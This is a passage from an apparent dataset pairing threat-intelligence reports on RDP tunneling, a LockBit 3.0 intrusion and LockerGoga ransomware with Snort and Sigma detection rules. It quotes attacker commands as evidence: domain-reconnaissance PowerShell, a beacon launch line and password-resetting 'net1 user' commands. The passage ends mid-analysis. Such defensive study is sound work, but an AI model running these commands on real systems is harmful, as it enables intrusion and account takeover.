`HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4`\n\n- **Event Logs**: Review event logs for high-fidelity logon events. Common RDP logon events are contained in the following event logs on Windows systems:\n  - `%systemroot%\\Windows\\System32\\winevt\\Logs\\Microsoft-TerminalServices-LocalSessionmanager%3Operational.evtx`\n  - `%systemroot%\\Windows\\System32\\winevt\\Logs\\Security.evtx`\n\n  The “TerminalServices-LocalSessionManager” log contains successful interactive local or remote logon events as identified by EID 21 and successful reconnection of a previously established RDP session not terminated by a proper user logout as identified by EID 25. The “Security” log contains successful Type 10 remote interactive logons (RDP) as identified by EID 4624. A source IP address recorded as a localhost IP address (127.0.0.1 – 127.255.255.255) may be indicative of a tunneled logon routed from a listening localhost port to the localhost’s RDP port TCP 3389.\n\n- Review your artifacts of execution for “plink.exe” file execution. Note that attackers can rename the file name to avoid detection. Relevant artifacts include, but are not limited to:\n  - Application Compatibility Cache/Shimcache\n  - Amcache\n  - Jump Lists\n  - Prefetch\n  - Service Events\n  - CCM Recently Used Apps from the WMI repository\n  - Registry keys\n\n### Network-Based Prevention:\n\n- **Remote Connectivity**: Where RDP is required for connectivity, enforce the connection to be initiated from a designated jump box or centralized management server.\n- **Domain Accounts**: Employ the “Deny log on through Remote Desktop Services” security setting for privileged accounts (e.g. domain administrators) and service accounts, as these types of accounts are commonly used by threat actors to laterally move to sensitive systems in an environment.\n\n### Network-Based Detection:\n\n- **Firewall Rules**: Review existing firewall rules to identify areas of vulnerability to port forwarding. In addition to the potential use of port forwarding, monitoring for internal communications between workstations in the environment should be conducted. Generally, workstations do not have a need to communicate with one another directly and Firewall rules can be used to prevent any such communication, except where needed.\n- **Network Traffic**: Perform content inspection of network traffic. Not all traffic communicating on a given port is what it appears to be. For example, threat actors may use TCP ports 80 or 443 to establish an RDP tunnel with a remote server. Deep inspection of the network traffic can likely reveal that it is not actually HTTP or HTTPS, but entirely different traffic all together. Therefore, organizations should closely monitor their network traffic.\n- **Snort Rules**: The main indicator of tunneled RDP occurs when the RDP handshake has a designated low source port generally used for another protocol. Figure 5 provides two sample Snort rules that can help security teams identify RDP tunneling in their network traffic by identifying designated low source ports generally used for other protocols.\n\n```\nalert tcp any [21,22,23,25,53,80,443,8080] -> any !3389 (msg:\"RDP - HANDSHAKE [Tunneled msts]\"; dsize:<65; content:\"|03 00 00|\"; depth:3; content:\"|e0|\"; distance:2; within:1; content:\"Cookie: mstshash=\"; distance:5; within:17; sid:1; rev:1;)\n```\n\n```\nalert tcp any [21,22,23,25,53,80,443,8080] -> any !3389 (msg:\"RDP - HANDSHAKE [Tunneled]\"; flow:established; content:\"|c0 00|Duca\"; depth:250; content:\"rdpdr\"; content:\"cliprdr\"; sid:2; rev:1;)\n```\n\n*Figure 5: Sample Snort Rules to identify RDP tunneling*\n\n## Conclusion\n\nRDP enables IT environments to offer freedom and interoperability to users. But with more and more threat actors using RDP to move laterally across networks with limited segmentation, security teams are being challenged to decipher between legitimate and malicious RDP traffic. Therefore, adequate host-based and network-based prevention and detection methods should be taken to actively monitor for and be able to identify malicious RDP usage.",
    "sigma_rule": {
      "title": "RDP Port Forwarding Rule Added Via Netsh.EXE",
      "id": "782d6f3e-4c5d-4b8c-92a3-1d05fed72e63",
      "status": "test",
      "description": "Detects the execution of netsh to configure a port forwarding of port 3389 (RDP) rule",
      "references": [
        "https://cloud.google.com/blog/topics/threat-intelligence/bypassing-network-restrictions-through-rdp-tunneling/"
      ],
      "author": "Florian Roth (Nextron Systems), oscd.community",
      "date": "2019-01-29",
      "modified": "2023-02-13",
      "tags": [
        "attack.lateral-movement",
        "attack.defense-evasion",
        "attack.command-and-control",
        "attack.t1090"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\netsh.exe"
          },
          {
            "OriginalFileName": "netsh.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            " i",
            " p",
            "=3389",
            " c"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate administration activity"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_netsh_port_forwarding_3389.yml",
    "id": "282"
  },
  {
    "url": "https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/",
    "markdown": "# Back in Black: Unlocking a LockBit 3.0 Ransomware Attack\n\n**19 August 2022**\n**By RIFT: Research and Intelligence Fusion Team**\n\n---\n\n## Summary\n\n### tl;dr\n\nThis post explores some of the TTPs employed by a threat actor who were observed deploying LockBit 3.0 ransomware during an incident response engagement.\n\nBelow provides a summary of findings which are presented in this blog post:\n\n- Initial access via SocGholish.\n- Establishing persistence to run Cobalt Strike beacon.\n- Disabling of Windows Defender and Sophos.\n- Use of information gathering tools such as Bloodhound and Seatbelt.\n- Lateral movement leveraging RDP and Cobalt Strike.\n- Use of 7zip to collect data for exfiltration.\n- Cobalt Strike use for Command and Control.\n- Exfiltration of data to Mega.\n- Use of PsExec to push out ransomware.\n\n---\n\n## LockBit 3.0\n\nLockBit 3.0 aka “LockBit Black”, noted in June of this year has coincided with a large increase of victims being published to the LockBit leak site, indicating that the past few months has heralded a period of intense activity for the LockBit collective.\n\nIn the wake of the apparent implosion of previous prolific ransomware group CONTI [1], it seems that the LockBit operators are looking to fill the void; presenting a continued risk of encryption and data exfiltration to organizations around the world.\n\n---\n\n## TTPs\n\n### Initial Access\n\nInitial access into the network was gained via a download of a malware-laced zip file containing SocGholish. Once executed, the download of a Cobalt Strike beacon was initiated which was created in the folder `C:ProgramDataVGAuthService` with the filename `VGAuthService.dll`. Along with this, the Windows command-line utility `rundll32.exe` is copied to the folder and renamed to `VGAuthService.exe` and used to execute the Cobalt Strike DLL.\n\nPowerShell commands were also executed by the SocGholish malware to gather system and domain information:\n\n- `powershell /c nltest /dclist: ; nltest /domain_trusts ; cmdkey /list ; net group 'Domain Admins' /domain ; net group 'Enterprise Admins' /domain ; net localgroup Administrators /domain ; net localgroup Administrators ;`\n- `powershell /c Get-WmiObject win32_service -ComputerName localhost | Where-Object {$_.PathName -notmatch 'c:win'} | select Name, DisplayName, State, PathName | findstr 'Running'`\n\n### Persistence\n\nA persistence mechanism was installed by SocGholish using the startup folder of the infected user to ensure execution at user logon. The shortcut file `C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Start MenuProgramsStartupVGAuthService.lnk` was created and configured to execute the following command which will run the Cobalt Strike beacon deployed to the host:\n\n- `C:\\ProgramData\\VGAuthService\\VGAuthService.exe`\n- `C:\\ProgramData\\VGAuthService\\VGAuthService.dll,DllRegisterServer`\n\n### Defence Evasion\n\nDeployment of a batch script named `123.bat` was observed on multiple hosts and was deployed via PsExec. The script possessed the capabilities to uninstall Sophos, disable Windows Defender and terminate running services where the service name contained specific strings.\n\nThe ransomware binary used also clears key Windows event log files including Application, System and Security. It also prevents any further events from being written by targeting the EventLog service.\n\n### Discovery\n\nBloodhound was executed days after the initial SocGholish infection on the patient zero host. The output file was created in the `C:\\ProgramData` directory and had the file extension `.bac` instead of the usual `.zip`, however this file was still a zip archive.\n\nA TGS ticket for a single account was observed on patient zero in a text file under `C:\\ProgramData`. It is highly likely the threat actor was gathering the ticket to attempt to crack the password, associated with the account, offline.\n\nSeatbelt [2] was also executed on the patient zero host alongside Bloodhound. Security-orientated information about the host gathered by Seatbelt was outputted to the file `C:\\ProgramData\\seat.txt`.\n\n### Lateral Movement\n\nThe following methods were utilized to move laterally throughout the victim network:\n\n- Cobalt Strike remotely installed temporary services on targeted hosts which executed a Cobalt Strike beacon. An example command line of what the services were configured to run is provided below:\n\n  ```\n  rundll32.exe c:\\programdata\\svchost1.dll,DllRegisterServer\n  ```\n\n- RDP sessions were established using a high privileged account the threat actor had compromised prior.\n\n### Collection\n\n7zip was deployed by the adversary to compress and stage data from folders of interest which had been browsed during RDP sessions.\n\n### Command and Control\n\nCobalt Strike was the primary C2 framework utilized by the threat actor to maintain their presence on the estate as well as laterally move.\n\n### Exfiltration Using MegaSync\n\nBefore deploying the ransomware to the network, the threat actor began to exfiltrate data to Mega, a cloud storage provider. This was achieved by downloading Mega sync software onto compromised hosts, allowing for direct upload of data to Mega.\n\n### Impact\n\nThe ransomware was pushed out to the endpoints using PsExec and impacted both servers and end-user devices. The ransomware executable was named `zzz.exe` and was located in the following folders:\n\n- `C:\\Windows`\n- `C:\\ProgramData`\n- `C:\\Users\\<user>\\Desktop`\n\n---\n\n## Recommendations\n\n1. Ensure that both online and offline backups are taken and test the backup plan regularly to identify any weak points that could be exploited by an adversary.\n2. Restrict internal RDP and SMB traffic so that only hosts that are required to communicate via these protocols are allowed to.\n3. Monitor firewalls for anomalous spikes in data leaving the network.\n4. Block traffic to cloud storage services such as Mega which have no legitimate use in a corporate environment.\n5. Provide regular security awareness training.\n\nIf you have been impacted by LockBit, or currently have an incident and would like support, please contact our Cyber Incident Response Team on +44 161 209 5148 or email cirt@nccgroup.com.\n\n---\n\n## Indicators of Compromise\n\n| IOC Value                                                                         | Indicator Type | Description                                                |\n| --------------------------------------------------------------------------------- | -------------- | ---------------------------------------------------------- |\n| orangebronze[.]com                                                                | Domain         | Cobalt Strike C2 server                                    |\n| 194.26.29[.]13                                                                    | IP Address     | Cobalt Strike C2 server                                    |\n| C:\\ProgramData\\svchost1.dll C:\\ProgramData\\conhost.dll C:\\ProgramData\\svchost.dll | File Path      | Cobalt Strike beacons                                      |\n| C:\\ProgramData\\VGAuthService\\VGAuthService.dll                                    | File Path      | Cobalt Strike beacon deployed by SocGholish                |\n| C:\\Windows\\zzz.exe C:\\ProgramData\\zzz.exe C:\\Users\\<user>\\Desktop\\zzz.exe         | File Path      | Ransomware Executable                                      |\n| c:\\users\\<user>\\appdata\\local\\megasync\\megasync.exe                               | File Path      | Mega sync software                                         |\n| C:\\ProgramData\\PsExec.exe                                                         | File Path      | PsExec                                                     |\n| C:\\ProgramData\\123.bat                                                            | File Path      | Batch script to tamper with security software and services |\n| D826A846CB7D8DE539F47691FE2234F0FC6B4FA0                                          | SHA1 Hash      | C:ProgramData123.bat                                       |\n\n---\n\n## MITRE ATT&CK®\n\n| Tactic              | Technique                                                             | ID        | Description                                                                                 |\n| ------------------- | --------------------------------------------------------------------- | --------- | ------------------------------------------------------------------------------------------- |\n| Initial Access      | Drive-by Compromise                                                   | T1189     | Initial access was gained via infection of SocGholish malware caused by a drive-by-download |\n| Execution           | Command and Scripting Interpreter: Windows Command Shell              | T1059.003 | A batch script was utilized to execute malicious commands                                   |\n| Execution           | Command and Scripting Interpreter: PowerShell                         | T1059.001 | PowerShell was utilized to execute malicious commands                                       |\n| Execution           | System Services: Service Execution                                    | T1569.002 | Cobalt Strike remotely created services to execute its payload                              |\n| Execution           | System Services: Service Execution                                    | T1569.002 | PsExec creates a service to perform it’s execution                                          |\n| Persistence         | Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | T1547.001 | SocGholish established persistence through a startup folder                                 |\n| Defence Evasion     | Impair Defenses: Disable or Modify Tools                              | T1562.001 | 123.bat disabled and uninstalled Anti-Virus software                                        |\n| Defence Evasion     | Indicator Removal on Host: Clear Windows Event Logs                   | T1070.001 | The ransomware executable cleared Windows event log files                                   |\n| Discovery           | Domain Trust Discovery                                                | T1482     | The threat actor executed Bloodhound to map out the AD environment                          |\n| Discovery           | Domain Trust Discovery                                                | T1482     | A TGS ticket for a single account was observed in a text file created by the threat actor   |\n| Discovery           | System Information Discovery                                          | T1082     | Seatbelt was ran to gather information on patient zero                                      |\n| Lateral Movement    | SMB/Admin Windows Shares                                              | T1021.002 | Cobalt Strike targeted SMB shares for lateral movement                                      |\n| Lateral Movement    | Remote Services: Remote Desktop Protocol                              | T1021.001 | RDP was used to establish sessions to other hosts on the network                            |\n| Collection          | Archive Collected Data: Archive via Utility                           | T1560.001 | 7zip was utilized to create archives containing data from folders of interest               |\n| Command and Control | Application Layer Protocol: Web Protocols                             | T1071.001 | Cobalt Strike communicated with its C2 over HTTPS                                           |\n| Exfiltration        | Exfiltration Over Web Service: Exfiltration to Cloud Storage          | T1567.002 | The threat actor exfiltrated data to Mega cloud storage                                     |\n| Impact              | Data Encrypted for Impact                                             | T1486     | Ransomware was deployed to the estate and impacted both servers and end-user devices        |\n\n---\n\n## References\n\n1. https://www.bleepingcomputer.com/news/security/conti-ransomware-finally-shuts-down-data-leak-negotiation-sites/\n2. https://github.com/GhostPack/Seatbelt",
    "sigma_rule": {
      "title": "Suspicious Group And Account Reconnaissance Activity Using Net.EXE",
      "id": "d95de845-b83c-4a9a-8a6a-4fc802ebf6c0",
      "status": "test",
      "description": "Detects suspicious reconnaissance command line activity on Windows systems using Net.EXE\nCheck if the user that executed the commands is suspicious (e.g. service accounts, LOCAL_SYSTEM)\n",
      "references": [
        "https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/",
        "https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/",
        "https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/"
      ],
      "author": "Florian Roth (Nextron Systems), omkar72, @svch0st, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2019-01-16",
      "modified": "2023-03-02",
      "tags": [
        "attack.discovery",
        "attack.t1087.001",
        "attack.t1087.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\net.exe",
              "\\net1.exe"
            ]
          },
          {
            "OriginalFileName": [
              "net.exe",
              "net1.exe"
            ]
          }
        ],
        "selection_group_root": {
          "CommandLine|contains": [
            " group ",
            " localgroup "
          ]
        },
        "selection_group_flags": {
          "CommandLine|contains": [
            "domain admins",
            " administrator",
            " administrateur",
            "enterprise admins",
            "Exchange Trusted Subsystem",
            "Remote Desktop Users",
            "Utilisateurs du Bureau à distance",
            "Usuarios de escritorio remoto",
            " /do"
          ]
        },
        "filter_group_add": {
          "CommandLine|contains": " /add"
        },
        "selection_accounts_root": {
          "CommandLine|contains": " accounts "
        },
        "selection_accounts_flags": {
          "CommandLine|contains": " /do"
        },
        "condition": "selection_img and ((all of selection_group_* and not filter_group_add) or all of selection_accounts_*)"
      },
      "falsepositives": [
        "Inventory tool runs",
        "Administrative activity"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_net_groups_and_accounts_recon.yml",
    "id": "285"
  },
  {
    "url": "https://www.trellix.com/en-sg/about/newsroom/stories/threat-labs/lockergoga-ransomware-family-used-in-targeted-attacks.html",
    "markdown": "# LockerGoga Ransomware Family Used in Targeted Attacks\n\n_April 29, 2019_\n\n## Initial discovery\n\nOnce again, we have seen a significant new ransomware family in the news. LockerGoga, which adds new features to the tried and true formula of encrypting victims’ files and asking for payment to decrypt them, has gained notoriety for the targets it has affected.\n\nIn this blog, we will look at the findings of the McAfee ATR team following analysis of several different samples. We will describe how this new ransomware works and detail how enterprises can protect themselves from this threat.\n\n## Technical analysis\n\nLockerGoga is a ransomware that exhibits some interesting behaviors we want to highlight. Based on our research, and compared with other families, it has a few unique functions and capabilities that are rare compared to other ransomware families that have similar objectives and/or targeted sectors in their campaigns.\n\nIn order to uncover its capabilities, we analyzed all the samples we found, discovering similarities between them, as well as how the development lifecycle adds or modifies different features in the code to evolve the ransomware in a more professional tool used by the group behind it.\n\nOne of the main differences between LockerGoga and other ransomware families is the ability to spawn different processes in order to accelerate the file encryption in the system:\n\n```image\nAlt: timeline\nDescription: The image shows a timeline activity related to the LockerGoga ransomware, depicting various processes that were executed over a time span of 54 seconds. It highlights specific executable files such as '3b200c8173a92c9441cb062d38012f6', 'cmd.exe', and 'imtvkneq1464.exe'. The timeline indicates instances of file operations, with several red circles representing the moments when files were accessed or modified, suggesting active encryption activity by the ransomware. The visual representation allows for analysis of the malware's behavior and its timing during the attack.\nTranscription: |\n  Timeline Activity\n  \n  Processes   Files   Registry Operations   Network Operations   Multiple Operations\n  \n  Select Any Area to Zoom In\n  \n  3b200c8173a92c9441cb062d38012f6\n  [Process Icon]\n  \n  cmd.exe\n  [File Icon]\n  \n  imtvknqq1464.exe\n  [File Icons]\n  \n  Offset in seconds\n  0  3  6  9  12  15  18  21  24  27  30  33  36  39  42  45  48  51  54\n```\n\nLike other types of malware, LockerGoga will use all the available CPU resources in the system, as we discovered on our machines:\n\n```image\nAlt: CPU usage\nDescription: The image depicts a 'System Information' window displaying CPU usage metrics. The graph shows fluctuations in CPU activity over time, with red areas indicating elevated usage and green areas representing lower usage. Key metrics such as total handles, threads, processes, context switch delta, interrupt delta, and DPC delta are also listed. This information is relevant to understanding the resource utilization of the LockerGoga ransomware during its operation.\nTranscription: |\n  System Information\n  \n  Summary | CPU | Memory | I/O\n  \n  CPU\n  \n  54.06%\n  \n  Totals\n  Handles          9,777\n  Threads          443\n  Processes        44\n  \n  CPU\n  Context Switch Delta  707\n  Interrupt Delta       151\n  DPC Delta             19\n  \n  Topology\n  Cores    2\n  Sockets  1\n  \n  [ ] Show one graph per CPU\n  \n  OK\n```\n\nMost of the LockerGoga samples work the same way but we observed how they added and removed certain types of functionality during their development lifecycle.\n\nThe ransomware needs to be executed from a privileged account.\n\nLockerGoga works in a master/slave configuration. The malware begins its infection on an endpoint by installing a copy of itself on the `%TEMP%` folder.\n\n```image\nAlt: Box1\nDescription: The image displays a technical log or output related to a ransomware operation, specifically focusing on file handling during the execution of the LockerGoga ransomware. It includes the 'ExistingFileName' indicating the original file that exists on the system, the 'Flags' showing the operations permitted (e.g., replacing an existing file and allowing a copy), and the 'NewFileName' which specifies the new filename for the file being created or modified. This information illustrates the process of how LockerGoga manages files on a compromised system.\nTranscription: |\n  ExistingFileName: C:\\Users\\tinba\\AppData\\Local\\Temp\\oHdwHyBv41qxe.exe\n  Flags: MOVEFILE_REPLACE_EXISTING|MOVEFILE_COPY_ALLOWED\n  NewFileName: C:\\Users\\tinba\\AppData\\Local\\Temp\\tgytutrc8363.exe\n```\n\nAfter being copied, it will start a new process with the `-m` parameter.\n\nThe master process runs with the `-m` parameter and is responsible for creating the list of files to encrypt and spawning the slaves.\n\nThe slave processes will be executed with a different set of parameters as shown below. Each slave process will encrypt only a small number of files, to avoid heuristic detections available in endpoint security products. The list of files to encrypt is taken from the master process via IPC, an interface used to share data between applications in Microsoft Windows. The communication is done through IPC using a mapped section named `SM-<name of binary>`.\n\nHere is the IPC technique used by LockerGoga:\n\n- The master process (run as `<LockerGogaBinary> -m`) creates a named section on the system for IPC.\n- The section is named “SM-tgytutrc”.\n- The master ransomware process posts the filepath of the file to be encrypted to the named section “SM-tgytutrc”.\n- This section is used by the slave processes to pick up the filepath and encrypt the target file.\n\n```image\nAlt: Slave processes\nDescription: The image is a technical log displaying details of process creation related to the LockerGoga ransomware. It includes sections for 'NtCreateSection' and 'CreateProcessInternalW', highlighting the creation of an IPC section named 'SM-tgytutr' and multiple instances of the process 'tgytutr210.exe'. Details such as application names, command lines, process IDs, thread IDs, and creation flags are shown, indicating how the ransomware spawns slave processes for file encryption.\nTranscription: |\n  +------------------+---------------------------------------------------------------------------------+\n  | **NtCreateSection**                                                                                |\n  +------------------+---------------------------------------------------------------------------------+\n  | ObjectAttributes | SM-tg\\tur.tc                                                                    |\n  | DesiredAccess    | STANDARD_RIGHTS_REQUIRED | SECTION_QUERY | SECTION_MAP_READ | SECTION_MAP_WRITE |\n  | SectionHandle    | 0x0000015c                                                                      |\n  | FileHandle       | 0x00000000                                                                      |\n  +------------------+---------------------------------------------------------------------------------+\n  | **NtOpenSection**                                                                                  |\n  +------------------+---------------------------------------------------------------------------------+\n  | DesiredAccess    | 0x0000000f                                                                      |\n  | ObjectAttributes | api-ms-win-appmodel-runtime-l1-1-1.DLL                                          |\n  | SectionHandle    | 0x00000000                                                                      |\n  +------------------+---------------------------------------------------------------------------------+\n  | DesiredAccess    | 0x0000000f                                                                      |\n  | ObjectAttributes | ext-ms-win-kernel32-package-current-l1-1-0.DLL                                  |\n  | SectionHandle    | 0x00000000                                                                      |\n  +------------------+---------------------------------------------------------------------------------+\n  | **CreateProcessInternalW**                                                                         |\n  +------------------+---------------------------------------------------------------------------------+\n  | ApplicationName  | C:\\Users\\█████████\\AppData\\Local\\Temp\\tgtyutrcc210.exe                          |\n  | ProcessId        | 1884                                                                            |\n  | CommandLine      | C:\\Users\\█████████\\AppData\\Local\\Temp\\tgtyutrcc210.exe -i SM-tg\\tur.tc -s       |\n  | ThreadHandle     | 0x0000017c                                                                      |\n  | ProcessHandle    | 0x00000184                                                                      |\n  | ThreadId         | 1648                                                                            |\n  | CreationFlags    | 0x00000000                                                                      |\n  +------------------+---------------------------------------------------------------------------------+\n  | **CreateProcessInternalW**                                                                         |\n  +------------------+---------------------------------------------------------------------------------+\n  | ApplicationName  | C:\\Users\\█████████\\AppData\\Local\\Temp\\tgtyutrcc210.exe                          |\n  | ProcessId        | 3704                                                                            |\n  | CommandLine      | C:\\Users\\█████████\\AppData\\Local\\Temp\\tgtyutrcc210.exe -i SM-tg\\tur.tc -s       |\n  | ThreadHandle     | 0x0000018c                                                                      |\n  | ProcessHandle    | 0x00000194                                                                      |\n  | ThreadId         | 3700                                                                            |\n  | CreationFlags    | 0x00000000                                                                      |\n  +------------------+---------------------------------------------------------------------------------+\n  | **CreateProcessInternalW**                                                                         |\n  +------------------+---------------------------------------------------------------------------------+\n  | ApplicationName  | C:\\Users\\█████████\\AppData\\Local\\Temp\\tgtyutrcc210.exe                          |\n  | ProcessId        | 560                                                                             |\n  | CommandLine      | C:\\Users\\█████████\\AppData\\Local\\Temp\\tgtyutrcc210.exe -i SM-tg\\tur.tc -s       |\n  | ThreadHandle     | 0x000001a8                                                                      |\n  | ProcessHandle    | 0x000001ac                                                                      |\n  | ThreadId         | 920                                                                             |\n  | CreationFlags    | 0x00000000                                                                      |\n  +------------------+---------------------------------------------------------------------------------+\n  | **CreateProcessInternalW**                                                                         |\n  +----------------------+-----------------------------------------------------------------------------+\n  | ApplicationName  | C:\\Users\\█████████\\AppData\\Local\\Temp\\tgtyutrcc210.exe                          |\n  | ProcessId        | 3200                                                                            |\n  | CommandLine      | C:\\Users\\█████████\\AppData\\Local\\Temp\\tgtyutrcc210.exe -i SM-tg\\tur.tc -s       |\n  | ThreadHandle     | 0x000001d0                                                                      |\n  | ProcessHandle    | 0x000001d8                                                                      |\n  | ThreadId         | 648                                                                             |\n  | CreationFlags    | 0x00000000                                                                      |\n  +------------------+---------------------------------------------------------------------------------+\n  | **CreateProcessInternalW**                                                                         |\n  +------------------+---------------------------------------------------------------------------------+\n  | ApplicationName  | C:\\Users\\█████████\\AppData\\Local\\Temp\\tgtyutrcc210.exe                          |\n  | ProcessId        | 792                                                                             |\n  | CommandLine      | C:\\Users\\█████████\\AppData\\Local\\Temp\\tgtyutrcc210.exe -i SM-tg\\tur.tc -s       |\n  | ThreadHandle     | 0x0000018c                                                                      |\n  | ProcessHandle    | 0x00000194                                                                      |\n  | ThreadId         | 3192                                                                            |\n  | CreationFlags    | 0x00000000                                                                      |\n  +------------------+---------------------------------------------------------------------------------+\n```\n\nSandbox replication of slave process (encryption process) below showing:\n\n- Obtaining access to the section created by the master process.\n- Reading and encryption of a target file found based on the filepath specified in the named section.\n\n```image\nAlt: Filepath\nDescription: The image is a technical screenshot showing a detailed view of system calls and file operations related to the LockerGoga ransomware's encryption process. It includes various segments such as NTOpenSection, NTCreateFile, NTQueryInformationFile, and NTRetrieveFile, along with the parameters and file names involved in these operations. The highlighted sections demonstrate how the ransomware interacts with the file system, particularly focusing on the manipulation of file attributes and the locking of files during encryption.\nTranscription: |\n  +----------------------+----------------------------------------------------------------------+\n  | **NtOpenSection**                                                                           |\n  +----------------------+----------------------------------------------------------------------+\n  | DesiredAccess        | 0x00000003                                                           |\n  | ObjectAttributes     | SM-tg\\tur.tc                                                         |\n  | SectionHandle        | 0x00000140                                                           |\n  +----------------------+----------------------------------------------------------------------+\n  | **NtCreateFile**                                                                            |\n  +----------------------+----------------------------------------------------------------------+\n  | FileName             | \\...\\test_xml_etree.py                                               |\n  | ShareAccess          | FILE_SHARE_READ | GENERIC_WRITE | FILE_READ_ATTRIBUTES | SYNCHRONIZE |\n  | ExistedBefore        | yes                                                                  |\n  | CreateDisposition    | FILE_OPEN                                                            |\n  | FileAttributes       | FILE_ATTRIBUTE_NORMAL                                                |\n  +----------------------+----------------------------------------------------------------------+\n  | **NtQueryInformationFile**                                                                  |\n  +----------------------+----------------------------------------------------------------------+\n  | FileInformationClass | FileAllInformation                                                   |\n  | HandleName           | \\...\\test_xml_etree.py                                               |\n  | FileInformation      | ████████████████████████████████████████████████████████████████████ |\n  +----------------------+----------------------------------------------------------------------+\n  | **NtQueryAttributesFile**                                                                   |\n  +----------------------+----------------------------------------------------------------------+\n  | FileName             | \\...\\test_xml_etree.py                                               |\n  +----------------------+----------------------------------------------------------------------+\n  | **NtOpenFile**                                                                              |\n  +----------------------+----------------------------------------------------------------------+\n  | ShareAccess          | FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE               |\n  | FileName             | \\...\\test_xml_etree.py                                               |\n  | DesiredAccess        | FILE_WRITE_ATTRIBUTES | SYNCHRONIZE                                  |\n  | FileHandle           | 0x0000017c                                                           |\n  +----------------------+----------------------------------------------------------------------+\n  | **NtSetInformationFile**                                                                    |\n  +----------------------+----------------------------------------------------------------------+\n  | FileInformationClass | FileBasicInformation                                                 |\n  | FileName             | \\...\\test_xml_etree.py                                               |\n  | FileInformation      | ████████████████████████████████████████████████████████████████████ |\n  +----------------------+----------------------------------------------------------------------+\n  | **NtQueryAttributesFile**                                                                   |\n  +----------------------+----------------------------------------------------------------------+\n  | FileName             | \\...\\test_xml_etree.py.locked                                        |\n  +----------------------+----------------------------------------------------------------------+\n  | **NtQueryFullAttributesFile**                                                               |\n  +----------------------+----------------------------------------------------------------------+\n  | FileName             | \\...\\test_xml_etree.py                                               |\n  +----------------------+----------------------------------------------------------------------+\n  | **MoveFileWithProgressW**                                                                   |\n  +----------------------+----------------------------------------------------------------------+\n  | ExistingFileName     | \\...\\test_xml_etree.py                                               |\n  | Flags                | MOVEFILE_REPLACE_EXISTING | MOVEFILE_COPY_ALLOWED                    |\n  | NewFileName          | \\...\\test_xml_etree.py.locked                                        |\n  +----------------------+----------------------------------------------------------------------+\n  | **NtOpenFile**                                                                              |\n  +----------------------+----------------------------------------------------------------------+\n  | ShareAccess          | FILE_SHARE_READ | FILE_SHARE_DELETE                                  |\n  | FileName             | \\...\\test_xml_etree.py.locked                                        |\n  | DesiredAccess        | FILE_GENERIC_READ | FILE_GENERIC_WRITE                               |\n  | FileHandle           | 0x0000017c                                                           |\n  +----------------------+----------------------------------------------------------------------+\n  | **NtReadFile**                                                                              |\n  +----------------------+----------------------------------------------------------------------+\n  | HandleName           | \\...\\test_xml_etree.py.locked                                        |\n  | Length               | ████████████████████████████████████████████████████████████████████ |\n  | FileHandle           | 0x0000017c                                                           |\n  | Buffer               | ████████████████████████████████████████████████████████████████████ |\n  +----------------------+----------------------------------------------------------------------+\n  | **NtWriteFile**                                                                             |\n  +----------------------+----------------------------------------------------------------------+\n  | FileHandle           | 0x0000017c                                                           |\n  | Buffer               | ████████████████████████████████████████████████████████████████████ |\n  +----------------------+----------------------------------------------------------------------+\n```\n\nThe ransomware creates multiple slave processes on the endpoint to encrypt files. Some analysts believe this is the case simply because it speeds up the encryption process, but we are not convinced as the same outcome can be achieved via a multi-threaded approach in the ransomware process instead of a multi-process approach.\n\nInstead, we suspect this approach is adopted for the following reasons:\n\n- **Footprint**: If every encryption process encrypts only a small number of files on the endpoint and terminates, then the overall footprint of the attack on the system decreases since it may be difficult to co-relate multiple encryption processes to the same threat.\n- **Sandbox Bypass**: Some sandbox-based detection systems monitor the threshold of the number of files written on the system and may co-relate it to the file extensions being written to. LockerGoga may be able to bypass such detection techniques.\n- **File I/O based detection bypass**: A multi-process-based approach makes sure that the amount of I/O (File/Disk I/O etc.) for each encryption process is within a certain limit, thus bypassing detection techniques that monitor exorbitant I/O based detection.\n- **Reliability**: Even if one encryption process is manually terminated by an end-user, as long as the master ransomware process is running the files will continue to be encrypted by new slave processes.\n\n### Username Administrator:\n\n```image\nAlt: Box 2\nDescription: The image is a technical output that displays details about a process related to the LockerGoga ransomware family. It includes specific attributes such as Application Name, Process ID, Command Line, Thread Handle, Stack Pivoted status, Process Handle, Thread ID, and Creation Flags. This information is relevant for understanding the behavior and characteristics of the ransomware, making it informative for readers seeking technical insights.\nTranscription: |\n  ApplicationName:\n  ProcessId: 2444\n  CommandLine: C:\\Windows\\system32\\net1 user Administrator HuHuHUHoHo283283@dJD\n  ThreadHandle: 0x000000fc\n  StackPivoted: no\n  ProcessHandle: 0x00000100\n  ThreadId: 3000\n  CreationFlags: NORMAL_PRIORITY_CLASS\n```\n\n### Username Tinba:\n\n```image\nAlt: Box 3\nDescription: The image presents a detailed log output related to a ransomware process. It includes key details such as the Application Name, Process ID, Command Line, Thread Handle, Process Handle, and other related process information. This data is typically used for analyzing the behavior of the ransomware during execution.\nTranscription: |\n  ApplicationName: \n  ProcessId: 3556\n  CommandLine: C:\\Windows\\system32\\net1 user tinba HuHuHUHoHo283283@dJD\n  ThreadHandle: 0x000000ec\n  StackPivoted: no\n  ProcessHandle: 0x000000fc\n  ThreadId: 3044\n  CreationFlags: NORMAL_PRIORITY_CLASS\n```\n\nThe author implemented a logging function that can be enabled if you call out the sample in execution using the parameter `-l` to store all the results in a file called `log.txt` in the root C drive:\n\n```image\nAlt: 